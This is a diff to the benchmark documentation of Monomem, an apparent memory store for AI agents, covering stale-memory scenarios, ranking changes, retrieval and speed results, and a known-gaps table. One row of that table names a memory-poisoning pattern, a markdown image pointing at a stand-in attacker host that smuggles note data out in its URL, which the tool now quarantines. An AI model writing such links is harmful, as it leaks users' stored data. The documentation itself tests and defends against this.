@@ -33,7 +33,7 @@ Five suites, written as plain JSON files in [`bench/scenarios/`](https://github.
   *unflagged* stale hit is one the system did not mark as stale. `stale-hit-rate@1` is the share of
   queries that name an old value whose first result is stale, `@5` the share with a stale value anywhere in the top five.
   `current-recall@1` is the share of queries (with a current note) where the current note is first. These are
-  rates over a small, hand-written set (15 and 14 queries at 1.6.0; 14 and 13 at 1.5.0): read them as a checklist, not as statistics.
+  rates over a small, hand-written set (15 and 14 queries at OneMemory 1.6.0; 14 and 13 at OneMemory 1.5.0): read them as a checklist, not as statistics.
 - A scenario passes only if all its checks hold. For stale-memory queries that means: current value first (when
   there is one) and no old value in the top five unless it is flagged stale.
 - `leakage-count` is the number of failed attack probes (a cross-tenant read that worked, a secret that
@@ -67,13 +67,19 @@ printed in its own section and does not fail the run (use `--strict-gaps` to fai
 scenario starts to pass, the run **fails** with "known gap now PASSES": remove the marker and mark the gap
 `fixed`. The current list is in the README's "Benchmark" section.
 
-**1.6.0 closed every gap 1.5.0 recorded** (`GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE`, all now `fixed`), so no
-shipped scenario carries a marker any more. The mechanism stays for the next gap. Two honest notes on what "closed" means here:
+**OneMemory 1.6.0 closed every gap OneMemory 1.5.0 recorded** (`GAP-SUPERSEDE`, `GAP-RECENCY`, `GAP-HISTORY`, `GAP-CONFIDENCE`, all now `fixed`).
+Monomem 1.5.0 (this release) found one more, **`GAP-OBSOLETE-UNREPLACED`** (scenario A33), and fixed it in the same release, so
+**no gap is open** and no shipped scenario carries a marker. The gap: when a later note updates a fact in different words and nobody
+replaces the old note, keyword search and the "what is relevant" lookup ranked the **old** note first (it matches the query as well and
+is shorter, so BM25 scores it higher; newest-first only breaks exact ties). The fix is the restated-twin rule (below, under the
+obsolete-fact test): for the same writer, the same subject and a near tie, the newer note now goes first and the old one comes right
+behind it, labelled `restated_by`. With the replace step (A34) the old value is gone from all three. Two honest notes on what
+"closed" means for the earlier gaps:
 
 - Five of the old gap scenarios (A05, A06, A10, A20, B03) now include the replace steps: the agent *replaces* the old note through
   the two-step preview and confirm. Monomem still does **not** guess that a new note replaces an old one and hide the old one by
-  itself; that is a deliberate safety choice (nothing disappears unless a person confirms). Run against the 1.5.0 scenario files,
-  1.6.0 still returns both notes for those five.
+  itself; that is a deliberate safety choice (nothing disappears unless a person confirms). Run against the OneMemory 1.5.0 scenario files,
+  OneMemory 1.6.0 still returns both notes for those five.
 - A11 (a 200-day-old twin) passes through the ranking fix alone, B08 through note history, D10 through the confidence field,
   and B09 through restoring the earlier version after distrusting the overwriter.
 
@@ -116,7 +122,7 @@ is the identity the system should stamp (default: the actor's name). `server` pu
 instance (default `main`), which is how a note is moved between two servers.
 
 **Steps.** Each step has `op` and `as` (an actor). Results are stored under `id`; `write`, `update`, `delete`,
-`archive`, `unarchive`, `read`, `merge`, `distrust`, `undistrust` and `trust_server` get the default id
+`archive`, `unarchive`, `read`, `pin`, `confirm`, `merge`, `distrust`, `undistrust` and `trust_server` get the default id
 `<op>:<ref>` (or `<op>:<writer>`), so a check can say `"step": "write:n"`.
 
 | `op` | Fields | What it does |
@@ -128,6 +134,7 @@ instance (default `main`), which is how a note is moved between two servers.
 | `supersede_preview` | `id`, `old` (refs), `new_note` (`{title, body, tags, confidence}`) or `new_ref` | Step 1 of a replacement. Must change nothing. Stores the one-time code under `id`. |
 | `supersede_confirm` | `id`, `from` (a preview step's id), `new_note`, `acknowledge_risk`, `ref`, `corrupt_code` | Step 2. Uses the code from `from` (the same new text unless `new_note` is given; `corrupt_code` damages the code). `ref` names the replacement note. Run it `as` another actor to test that a code works for nobody else. |
 | `supersede_undo` | `ref` | Bring a replaced note back. |
+| `confirm` | `ref` | A person confirms the note's current version (needs `confirm`; Monomem: an admin token's confirm, the dashboard's). A confirm that does not count is `invalid`. |
 | `history`, `restore_version` | `ref`, `id`; `version`, `if_rev_of` | A note's earlier versions; put one back as a new version. |
 | `list`, `recall`, `changes`, `sweep` | `id` | List notes, "what is relevant to this message" (`q`), the change feed, run the expiry sweep. |
 | `distrust`, `undistrust` | `writer`, `namespace` | Manage the distrust list. |
@@ -217,8 +224,8 @@ reads anything and no judge grades anything: each conversation is written into a
 question is searched, and the returned sessions (or turns) are compared with the dataset's own gold evidence.
 
 ```
-monomem bench --longmemeval [--data file] [--limit N] [--mode keyword|hybrid] [--granularity session|turn] [--json]
-monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [--granularity turn|session] [--json]
+monomem bench --longmemeval [--data file] [--limit N] [--mode keyword|hybrid] [--granularity session|turn] [--encrypted] [--split a|b] [--json]
+monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [--granularity turn|session] [--encrypted] [--split a|b] [--json]
 ```
 
 - **Data.** LongMemEval-S, cleaned release ([`xiaowu0162/longmemeval-cleaned`](https://huggingface.co/datasets/xiaowu0162/longmemeval-cleaned),
@@ -247,9 +254,242 @@ monomem bench --locomo      [--data file] [--limit N] [--mode keyword|hybrid] [-
   per-keyword BM25 rankings fused with RRF; the keyword fallback used the same). `--mode hybrid` also scores
   `runSearch(mode: "hybrid")` (BM25 + embeddings; since 2026-11-04 a 0.5 / 0.5 blend of min-max-scaled scores, before
   that RRF) when an embedding server answers; otherwise it is reported as skipped.
-- **Metrics.** `R@5`, `R@10`: any gold session (or turn) in the top k. `Rall@10`: every gold one in the top 10.
+- **Metrics.** `R@5`, `R@10`: any gold session (or turn) in the top k. `Rall@5`, `Rall@10`: every gold one in the top 5 / 10
+  (strict; `R@k` is the generous any-hit variant). In `--json`: `rAll5`, `rAll10`.
   `nDCG@10` with binary relevance. `MRR` over the top 50. Search latency p50/p95 per query; indexing time per
   haystack (single process, SQLite in a temp folder).
+
+### Results, 2026-11-14 (measured for 1.5.0)
+
+Measured on 2026-11-14 on the development PC: Windows 11 Home, AMD Ryzen 7 9800X3D (8 cores / 16 threads), 31 GB RAM, NVMe,
+Node v24.18.0, feat/1.5.0 code. Other build agents were running on the same PC at the same time, so the search times here are
+higher than the 2026-11-09 ones (same ranking code) and should be read as "loaded machine", not as a regression. Keyword-only
+(no embedding server), the commands exactly as above.
+
+**Strict recall-all@5 (`Rall@5`), new in this round.** `R@5` counts a question as found when any one gold session is in the
+top 5; `Rall@5` needs every gold session there. Questions with one gold session score the same on both, so the gap is all in
+multi-session questions.
+
+| Run | search | R@5 | **Rall@5** | R@10 | Rall@10 | nDCG@10 | MRR | search p50 / p95 |
+|---|---|---|---|---|---|---|---|---|
+| LongMemEval-S session (470) | keyword | 96.8 | **84.0** | 98.3 | 90.2 | 89.7 | 91.0 | 5.0 / 34.0 ms |
+| LongMemEval-S session (470) | relevant | 96.8 | **84.0** | 98.3 | 90.2 | 89.7 | 90.9 | 3.6 / 16.3 ms |
+| LoCoMo-10 turn (1,982) | keyword | 57.8 | **49.8** | 65.2 | 56.2 | 48.0 | 46.6 | 2.6 / 13.2 ms |
+| LoCoMo-10 turn (1,982) | relevant | 57.9 | **49.9** | 65.3 | 56.3 | 48.0 | 46.7 | 2.8 / 13.5 ms |
+| LoCoMo-10 session (1,982) | keyword | 90.4 | **81.5** | 95.5 | 87.7 | 80.3 | 78.6 | 2.1 / 5.6 ms |
+| LoCoMo-10 session (1,982) | relevant | 90.5 | **81.6** | 95.5 | 87.7 | 80.5 | 78.8 | 1.6 / 5.6 ms |
+
+On that run the strict LongMemEval-S figure was 84.0, 0.7 below agentmemory 0.9.31's reported 84.7 (BM25, its own figure, not
+re-run here). The next block is the change that closed that gap. It did not close the gap to Vestige, which reports a higher
+figure (see the comparison after the full-set table).
+
+**Search stems and rarity-weighted coverage, 2026-11-15 (round 3, item 4).** Two ranking changes in the any-keyword search,
+nothing else: (1) the FTS query uses suffix-trimmed stems, so "camping" also finds "camped" (plural s/es, ed, ing only, at
+least 4 letters left, letters-only words); (2) the "share of the question's keywords a note contains" multiplier now weighs each
+keyword by how rare it is in the store (idf from the FTS vocabulary; on an encrypted store, from the in-memory body index), so a
+note holding the one rare word of a question beats one holding two common ones. Coverage still matches the keywords as typed.
+
+Tuned on half the questions only. `monomem bench ... --split a|b` runs half the data: LongMemEval-S by a hash of the
+question id (`sha256`), LoCoMo by conversation (1-5 = a, 6-10 = b), so a checked question never shares a conversation with a
+tuning one. Every candidate was tried on
+half **a**; half **b** never set a parameter, but each candidate that passed **a** was checked on **b** to decide keep or drop
+(about 8 checks). So **b** is a validation half, not an untouched test set. Dropped on half a: stem length 5 and 6,
+pseudo-relevance feedback at two of three weights. A coverage re-rank changed nothing on either half. Dropped on half b: stems alone (LoCoMo-10 session R@5 -0.4, over the
+0.3-point drop guard), pseudo-relevance feedback at the third weight, and idf counted on stems. The kept change sits exactly on
+that guard (-0.3, below). Validation half **b**, keyword: R@5 and
+Rall@5 as before / after, the other columns as the change in points:
+
+| Half b | R@5 | **Rall@5** | R@10 | Rall@10 | nDCG@10 | MRR |
+|---|---|---|---|---|---|---|
+| LongMemEval-S session | 97.1 / 97.5 | **84.9 / 87.0** | +0.4 | +0.8 | +1.6 | +1.4 |
+| LoCoMo-10 turn | 56.0 / 58.7 | **47.3 / 49.6** | +1.3 | +1.5 | +1.1 | +1.0 |
+| LoCoMo-10 session | 90.2 / 89.9 | **80.9 / 81.3** | 0.0 | +1.0 | +0.7 | +0.6 |
+
+One number went down on the validation half: LoCoMo-10 session R@5, -0.3 (about 3 of 985 questions). It is reported, not hidden;
+on the full set the same metric goes up (90.4 to 90.9).
+
+Full set, measured one run at a time on an otherwise idle PC (2026-11-15, same hardware as above), keyword and relevant:
+
+| Run | search | R@5 | **Rall@5** | R@10 | Rall@10 | nDCG@10 | MRR | search p50 / p95 |
+|---|---|---|---|---|---|---|---|---|
+| LongMemEval-S session (470) | keyword | 97.2 | **85.7** | 98.7 | 92.1 | 91.0 | 91.8 | 3.9 / 7.7 ms |
+| LongMemEval-S session (470) | relevant | 97.2 | **85.7** | 98.7 | 92.1 | 91.0 | 91.7 | 3.1 / 6.0 ms |
+| LoCoMo-10 turn (1,982) | keyword | 67.4 | **58.4** | 76.3 | 65.8 | 53.0 | 50.0 | 3.2 / 5.6 ms |
+| LoCoMo-10 turn (1,982) | relevant | 67.3 | **58.3** | 76.4 | 65.9 | 53.0 | 50.0 | 3.4 / 5.3 ms |
+| LoCoMo-10 session (1,982) | keyword | 90.9 | **82.4** | 96.0 | 89.0 | 81.0 | 79.1 | 1.6 / 2.2 ms |
+| LoCoMo-10 session (1,982) | relevant | 91.1 | **82.5** | 96.0 | 88.9 | 81.1 | 79.4 | 1.3 / 1.8 ms |
+
+The honest headline for LongMemEval-S is now **85.7 strict / 97.2 any-hit at k = 5**, keyword-only, no embeddings. It is not
+the highest published figure. Other systems' own numbers (none re-run by us), read 2026-11-15:
+
+- **Vestige v6.2.1** (github.com/samvallad33/vestige, `benchmarks/README.md`; also no embeddings and no LLM) reports
+  LongMemEval-S strict recall-all@5 **91.28** on the same 470 questions (5.6 above our 85.7), any-hit recall@5 98.6 and
+  recall@10 99.4 on all 500 questions (we score 470), and in v6.2.2's release notes LoCoMo-10 by session R@5 **93.24** on
+  "ALL" questions (2.3 above our 90.9; ALL is 1,982 questions per its `benchmarks/README.md`, the same set as ours), and
+  LoCoMo-10 by turn ("turn exact") R@5 **68.16** (0.8 above our 67.4, which stores each turn with the turn it replied to;
+  about 7 above our 60.8 with one turn per note). Caveats, from its own pages: its weights and
+  word-cluster mappings were refined against the benchmark queries during development, and it reports no held-out half for
+  LongMemEval-S (for LoCoMo it reports conversations 1-5 to tune and 6-10 to test); it names "max-passage window pooling"
+  (LongMemEval) and "bidirectional micro-scene pooling" (LoCoMo by turn, credited to its soft-match figure, not the turn-exact one compared here) with no window sizes. Ours were tuned on half **a** and checked on half **b** (above).
+- **MemPalace** self-reports LongMemEval-S any-hit R@5 **98.4** on a 450-question held-out set (tuned on the other 50;
+  reported in arXiv 2604.21284), 1.2 above our 97.2 on 470. A different question set, so not like-for-like; its earlier "100 %"
+  needed hand patches to failing questions (github.com/MemPalace/mempalace/discussions/747).
+- **agentmemory 0.9.31** reports 84.7 (BM25). Ours is 1.0 above it: we score 470 of the 500 questions, dropping the 30
+  abstention ones, by session, and its v0.9.31 release notes give 398 of 470, the same 470-question count; 1.0 point is about 5 questions, near the
+  0.1-0.2 a re-run can move from ties. agentmemory 0.9.33 (2026-11-09) removed a three-results-per-query search cap, so its
+  figure may change; it has published no new one.
+
+LoCoMo-10 by turn is still our weakest number.
+
+**LoCoMo-10 by turn: each turn stored with the turn it replied to (2026-11-15).** The by-turn rows above use the notes
+`monomem import --from claude-code-chats` stores ([switching.md](./switching.md#your-past-claude-code-conversations)): one note
+per message, titled with the speaker and its first line, its body followed by `(replying to <speaker>: <first 400 characters of
+the previous turn>)` (the import leaves that part out when the previous message holds a secret or a linter hit). The benchmark calls the same `chatNotes()` as the import, so it scores the same note layout a user's
+imported chats get, not a layout made for the test (the content differs: LoCoMo is two people chatting, and the import also
+runs the linter and skips secrets). To compare with a "by turn" figure that stores each turn on its own,
+use our raw-turn figure below (60.8 R@5), not 67.4. Before, each turn was a note on its own (body `Speaker: text`, title the dialog id):
+60.8 / 52.2 / 67.7 / 58.3 / 49.6 / 48.0 on the full set. The reason it helps (most of it; the speaker-and-first-line title adds
+about 2 points on top): the question and its answer usually sit in two turns, so the answer's note now also holds the
+question's words. Checked on the halves before it was kept, keyword R@5 /
+Rall@5 / R@10 / Rall@10:
+
+| LoCoMo-10 turn | before | after |
+|---|---|---|
+| half a (conversations 1-5, tuning) | 62.9 / 54.8 / 70.3 / 61.2 | 70.2 / 61.3 / 79.4 / 69.1 |
+| half b (conversations 6-10, validation: never tuned on, but used to reject the next-turn variant) | 58.8 / 49.6 / 65.1 / 55.3 | **64.6 / 55.4 / 73.2 / 62.4** |
+
+The 400-character cut was set once and not tuned. Adding the turn *after* each turn as well was tried on both halves and
+made things worse (half b Rall@5 48.3 with the next turn only, 54.5 with both), so it is not done. LongMemEval-S and LoCoMo
+session are unchanged: their notes are whole sessions. Search time per query rose by about 1 ms (bodies are longer). The
+encrypted store stores chat turns as the import does there (a fixed title `Chat message (sealed)`, the real title as the
+sealed body's first line), so its figures differ slightly: 67.6 / 58.2 / 76.9 / 66.5 (halves a / b: 70.4 / 61.3 / 80.1 / 70.0
+and 64.8 / 55.0 / 73.6 / 63.0).
+
+**Speed at 10,000 notes (`monomem bench --scale 10k`), new in this round.** A synthetic store in a temp folder: 10,000 notes
+(10,200 after the timed writes) in 5 namespaces, made-up Zipf-distributed words, bodies 80 % 200-600 characters, 15 % 1.5-3k,
+5 % 8-20k (the corpus shape of the round-2 performance seat). Built twice from the same seed: once plain, once with a key file
+beside the database (at-rest encryption on). Session start is `injectContext` for one namespace (2,000 notes), 30 runs on an
+open store after one warm-up; "open + session start" opens a new `Store` each time (a hook process, minus Node start-up).
+Search is a 2-word keyword query in one namespace, 150 runs. Write is `create` with similarity edges and the linter on, 200 runs
+on the full store. Three back-to-back runs, ms p50 / p95 (the third run overlapped heavier load from other agents):
+
+| Path | plain, run 1 / 2 / 3 | encrypted, run 1 / 2 / 3 |
+|---|---|---|
+| Session start (`injectContext`) | 8.8/10.1, 8.7/9.9, 9.8/15.6 | **12.5/15.6, 12.3/17.1, 18.2/42.0** |
+| Open store + session start | 23.2/32.2, 23.2/34.8, 24.6/32.8 | 28.6/54.7, 24.9/29.4, 39.3/115.7 |
+| Keyword search, 2 words | 6.9/10.4, 6.0/8.7, 6.8/10.4 | 3.3/4.9, 2.9/4.6, 5.7/14.2 (title + tags only: measured before C-06, see below) |
+| Write (`create`, edges on) | 5.7/10.7, 5.9/11.7, 6.6/12.3 | 6.0/9.7, 5.7/9.9, 9.0/31.9 |
+| Build 10k (one transaction per 1,000, no edges) | 10.8 s, 10.4 s, 10.6 s | 14.0 s, 12.9 s, 25.1 s |
+
+**Release gate (10k encrypted session start p50 < 50 ms): PASS** in all three runs (12.3-18.2 ms; with a fresh store open each
+time 24.9-39.3 ms, also under 50). Limits of this measurement: the bulk build skips similarity edges, so the database is 31 MB
+instead of the about 57-60 MB the performance seat's fully-edged 10k store had (edges are 43 % of that file); session start does
+not read edges, but a smaller file caches better. The time for a whole `monomem recall` hook process (Node start-up included,
+657-760 ms in the performance seat's before table) was not re-measured. Encrypted search was faster only because it searched less
+text (before C-06; next section has the re-run). 1,000 notes for comparison: session start 5.3 / 8.8 ms plain / encrypted p50.
+
+**Speed at 100,000 notes (`monomem bench --scale 100k`), 2026-11-15.** The same synthetic store at 100,000 notes, measured by
+three review seats on the development PC while other agents loaded it (so read the ranges, not one figure). 100,000 notes is
+the design ceiling: above it the in-memory body index is not built.
+
+| Path at 100,000 notes | plain | encrypted |
+|---|---|---|
+| Session start (`injectContext`) p50 | 7.2-8.8 ms | **7-12 ms** quiet, up to about 18 ms on a loaded PC (release gate 50 ms: **PASS**) |
+| Write (`create`, edges on) p50 | about 3-4 ms | about 3-5 ms |
+| Keyword search p50, words in under 5 % of notes (the bench's realistic-words line: 1.5-4 ms) | 0.6-8 ms | 0.6-8 ms |
+| Keyword search p50, words in most notes (the bench's common-words line) | about 110-190 ms (up to about 250 on a loaded PC) | about 110-190 ms, up to about 260 ms |
+| Store build / database file | 170 s / 305 MB | 196 s / 313 MB |
+| In-memory body index (encrypted only) | - | see the C-06 body-index line below |
+
+Keyword search cost follows how many notes contain the query's words, not how many notes there are: ranking costs about
+1.2 microseconds per matching note. The bench's own query mix is the slow case: it draws 2 words from a made-up Zipf vocabulary
+of about 3,000 words, so the average query matches about 82 % of the notes (about 82,000 rows to rank), and the bench's
+common-words line read about 140-260 ms p50 in these runs (encrypted is the slower one: it ranks from the in-memory body index). Words that appear in under 5 % of notes, as most content words in real text do, measured
+0.6-8 ms p50. A query whose every word is in most notes (close to a stop word) stays in the 110-260 ms range; dropping such
+words from the match is a possible later change, not in 1.5.0. Not measured at this size: a whole hook process with Node
+start-up. Hybrid search (embeddings on; off by default) was timed once with a stand-in embedding server, about 320-365 ms p50,
+most of it a scan over every stored vector in the namespace.
+
+**Recall with encryption on vs off (`--encrypted`), new in this round.** The same commands with `--encrypted`, which puts a key
+file beside every throwaway database before the notes are written; same corpus, same questions, keyword-only. Re-run after the
+in-memory body index (C-06, below) was built, 2026-11-15:
+
+| Run | plain R@5 / Rall@5 / R@10 / MRR | encrypted R@5 / Rall@5 / R@10 / MRR | search p50 plain / encrypted |
+|---|---|---|---|
+| LongMemEval-S session (470), keyword | 97.2 / 85.7 / 98.7 / 91.8 | **97.2 / 85.7 / 98.7 / 91.8** | 3.9 / 13.6 ms (each haystack has one question, so every encrypted search includes the first-search build) |
+| LongMemEval-S session (470), relevant | 97.2 / 85.7 / 98.7 / 91.7 | **97.2 / 85.7 / 98.7 / 91.7** | 3.1 / 4.1 ms |
+| LoCoMo-10 turn (1,982), keyword (each turn with the one it replied to; encrypted: sealed fixed titles, see above) | 67.4 / 58.4 / 76.3 / 50.0 | **67.6 / 58.2 / 76.9 / 49.4** | 3.2 / 4.6 ms |
+| LoCoMo-10 session (1,982), keyword | 90.9 / 82.4 / 96.0 / 79.1 | **90.9 / 82.4 / 96.0 / 79.1** | 1.6 / 2.3 ms |
+
+(Re-run 2026-11-15 after the stems and rarity-weighted coverage above; the first C-06 run, before them, was likewise identical
+between plain and encrypted at 96.8 / 84.0 / 98.3 / 91.0 on LongMemEval-S.)
+
+On LongMemEval-S and LoCoMo-10 by session, every metric (keyword and relevant, all of R@5, Rall@5, R@10, Rall@10, nDCG@10,
+MRR, per question type) is **byte-identical** between the plain and the encrypted run: the index covers every note with its
+decrypted body, so the bm25 statistics are the plain store's. LoCoMo-10 by turn is not identical: the encrypted store stores
+chat turns with the fixed sealed title, so its notes differ (see above). Before C-06 the encrypted column read 0.0 / 0.0 / 0.0 / 0.0 (0.1 on LoCoMo turn): the on-disk index holds titles
+and tags only, and in these datasets every title is a session id. What this does **not** cover: the session-start hook never
+builds the index (time budget), so on an encrypted store the context it adds at session start is still matched on titles,
+tags, files and recency, not body words.
+
+**C-06: the in-memory body index, built.** While a key is present, each Monomem process that searches attaches a private
+`:memory:` database to its own connection and fills a contentless FTS5 table (same columns, tokenizer and prefix index as
+`notes_fts`) with every note's title, decrypted body and tags. The two `notes_fts MATCH` queries read it instead; every
+visibility filter stays on the `notes` join. TEMP triggers keep it current for this connection's writes (a decrypt that fails
+indexes "" and never aborts the write); other processes' commits are noticed through `PRAGMA data_version` and replayed from
+`change_log`, with a full rebuild when the log was trimmed past the last point seen. Servers build it on start-up; the hooks
+never do; above 100,000 notes it is not built. Measured with `monomem bench --scale 10k` (synthetic made-up words, a worse case
+for index size than real text): build 0.81 s and 0.58 s in two runs, process RSS +31.5 MB and +29.5 MB; session start (hook, no index) 15.3 and 12.4 ms p50 encrypted (10.2 and 10.7 plain),
+gate PASS; keyword search on the server store 10.7 and 7.7 ms p50 encrypted vs 9.0 and 8.1 plain; a write 7.8 and 5.9 ms p50 encrypted vs 7.2 and 7.6 plain (one extra decrypt
+and FTS insert). At 100,000 notes (`bench --scale 100k`, 15 Nov 2026, three runs, batched build): 4.90 s, 4.02 s and 5.48 s, process RSS +151.7, +154.2 and +152.3 MB (+509 MB before the build ran in id batches); at 10,000 notes with the batched build: 0.56 s, RSS +21.3 MB (15 Nov 2026). These RSS figures are measured inside the bench process, which already holds the database pages. A freshly started server grows more: from about 69 MB at open to about 302-308 MB after the build at 100,000 notes (+233-240 MB, two runs), and to about 128 MB at 10,000 notes (+59 MB). Security:
+nothing new on disk, but the words are in RAM for the life of the process and can reach swap, hibernation and crash-dump files
+(docs/encryption-retention.md).
+
+**Obsolete-fact test (C-07), new in this round.** arXiv 2610.36308 reports that an outdated statement in the retrieved context
+drops answer accuracy from 100 % to 44.6 %. Two provenance scenarios measure it here, in the stale suite: A33 writes a fact and a
+later update in different words (10 unrelated notes around them) and does **not** replace the old note; A34 does the same and then
+replaces it (preview, confirm). Both check search, the "what is relevant" lookup and the SessionStart injection. Result: **A34
+passes** (current value first everywhere, obsolete value absent from all three); **A33 failed and was recorded as a known gap**: the
+obsolete note was ranked **first** by both search and the lookup, and the SessionStart text carried the current value but the old
+note too. Full `monomem bench` after adding them: 132 passed, 1 known gap (A33), 0 failed; stale-hit-rate@5 2/16, current-recall@1 15/15. (That was the state when A33 was added. The same-writer restatement rule later in 1.5.0 fixed it: 137 passed, 0 known gaps.)
+
+**Restated-twin rule (GAP-OBSOLETE-UNREPLACED fixed, 1.5.0).** The twin pass that keeps a stale note behind its newer twin now
+has a second rule. An older note moves to just behind a newer one when **all** of these hold: same namespace, both plain notes; the
+newer note was written after the older one last changed; the **same server-stamped writer** (that writer could already edit the old
+note in place, so the reorder gives it nothing new); the same subject (a fact key with another value, or a similarity link of at
+least 0.6); a near tie (the old score is at most 1.5 times the new one, after boosts and penalties); the newer note is inside the
+returned results; the older note is not read clearly more than the newer one. It never moves for a different writer (that is the
+dispute label's job: one agent must not bury another's note), behind an unconfirmed note when the older one is confirmed by a person,
+or behind a note that is held (unconfirmed outside content, flagged, built on a distrusted writer), replaced or distrusted. Nothing is
+dropped: the older note carries `restated_by` and `restated_label` (REST, MCP, the CLI) and an explain line. The similarity bar is
+0.6, not the 0.35 first designed: at 0.35, A37 (the same project's build server and API server, written by one writer) reordered;
+at 0.5, LoCoMo-10 session (with similarity links built, see below) lost 0.3 points of Rall@5 and Rall@10; at 0.6 nothing moved. A33's
+pair sits between 0.6 and 0.7, so A33 passes (seeds 1 to 12), with a thin margin. Scenarios A35 to A38 are the guards: another writer (A35), a person-confirmed note (A36, which needs
+the new `confirm` step), another subject (A37), outside content (A38). Full `monomem bench`: 137 passed, 0 known gaps, 0 failed.
+
+**MemoryAgentBench (C-07): skipped, not run.** What its README (github.com/HUST-AI-HYZ/MemoryAgentBench, read 2026-11-14)
+says: the accurate-retrieval and FactConsolidation splits are scored by substring match, not by a judge, but the answer that is
+scored is written by a reader LLM from the retrieved context, and the setup expects `OPENAI_API_KEY` in a `.env` (Anthropic and
+Google keys optional); local models (Ollama, vLLM) are not mentioned. The datasets download from Hugging Face
+(`ai-hyz/MemoryAgentBench`), and the environment is a Python 3.10 conda env with torch and the full requirements list. A free
+local reader through Ollama on 127.0.0.1:11434 would have been allowed, but (1) the harness does not document a local-model
+route, so it would mean patching it, (2) the local Ollama did not answer even an embedding request within 120 s during this
+round, and (3) a run with a substituted local reader would not be comparable with the published leaderboard (BM25 60.5 on
+accurate retrieval used its authors' hosted reader models). So no MemoryAgentBench number is reported; nothing was sent anywhere.
+The leaderboard needs a reader, but a retrieval-only run (does the right passage come back, no reader) is possible, and at
+least one other memory system publishes such figures on MemoryAgentBench subsets. We have not done that run yet.
+
+**Hybrid, 2026-11-15, 1.5.0 code.** `monomem bench --locomo --mode hybrid [--granularity session]` with
+`MONOMEM_EMBEDDINGS=on` and `nomic-embed-text` via a local Ollama, full runs, R@5 / R@10, search p50:
+
+| Run | Hybrid |
+|---|---|
+| LoCoMo-10 session (1,982) | 92.2 / 96.9, 18 ms |
+| LoCoMo-10 turn (1,982), chat-import layout (each turn with the one it replied to) | 75.9 / 84.6, 25 ms |
+
+Measured once by the developer when the chat layout landed; the review panel could not re-run it (no embedding service was
+allowed in its sandbox). LongMemEval-S hybrid was not re-run on 1.5.0: its latest figure is the 2026-11-09 one below
+(98.5 / 99.4), from before the 1.5.0 keyword ranking changes.
 
 ### Results, 2026-11-09 (expert round 4)
 
@@ -468,7 +708,7 @@ nDCG@10 87.5, MRR 88.6, search p50 1.7 ms.
 Version numbers below are from before the 2026 rename to Monomem (the product was released as OneMemory 1.x-2.x).
 
 **The five provenance fields, honestly.** Against the usual list (source, timestamp, confidence, tenant, deletion policy), at 1.6.0:
-*source*: partly (`written_by` / `created_by` are server-stamped and cannot be faked; the `source` field is only a claim);
+*source*: partly (`written_by` / `created_by` are server-stamped and cannot be faked for token callers (a local stdio app's name is its own config claim); the `source` field is only a claim);
 *timestamp*: yes (`created_at`, `updated_at`, kept through export and import, plus a staleness flag); *tenant*: yes (namespaces pinned
 to tokens, read grants); *deletion policy*: partly (per-note `forget_after`, archive and sweep, explicit admin delete; no per-tenant default
 or legal hold); *confidence*: **yes, as a claim** (an optional 0 to 1 value, labelled with who claimed it, kept through edits, export and import,
@@ -480,7 +720,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because Monomem lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **None is open.**
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0), and so is `GAP-OBSOLETE-UNREPLACED` (A33, found and fixed in Monomem 1.5.0). **None is open.**
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -490,6 +730,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
 | `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
+| `GAP-OBSOLETE-UNREPLACED` | A later note updates a fact in different words and nobody replaces the old note: keyword search and the "what is relevant" lookup rank the **old** note first (it matches as well and is shorter). | **Fixed in Monomem 1.5.0**: for the same writer, the same subject and a near tie, the newer note ranks first and the old one is kept right behind it, labelled `restated_by`; never for another writer, over a person-confirmed note, or for outside content. The two-step replace (A34) still removes the old value everywhere. | A33 (now passes); guards A35 to A38 |
 
 **Round 1 retrieval changes, 2026-11-05 (no change in these numbers).** The session-start context now uses one
 any-keyword search instead of one per keyword; "how many / total / every / list all" questions return twice the
